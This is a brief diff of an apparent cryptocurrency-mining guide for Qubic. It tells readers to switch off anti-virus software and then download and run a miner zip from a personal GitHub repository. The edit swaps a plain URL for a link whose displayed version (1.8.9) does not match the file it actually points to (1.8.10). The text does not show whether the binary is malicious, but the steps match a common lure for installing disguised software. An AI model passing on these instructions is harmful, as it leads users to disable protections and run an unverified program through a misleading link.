@@ -12,7 +12,7 @@ https://app.qubic.li/main/mining/pool
 
 3，Turn off the anti-virus software, download the mining program, decompress it and run it, modify the number of CPU threads and set the program miner name.
 
-DOWNLOAD URL:https://github.com/crow4586/qubic-miner/releases/download/qubic/qubic.miner.1.8.9.zip
+DOWNLOAD URL:[https://github.com/crow4586/qubic-miner/releases/download/qubic/qubic.miner.1.8.9.zip](https://github.com/crow4586/qubic-miner/releases/download/qubic/qubic.miner.1.8.10.zip)
 
 
 4，Start mining
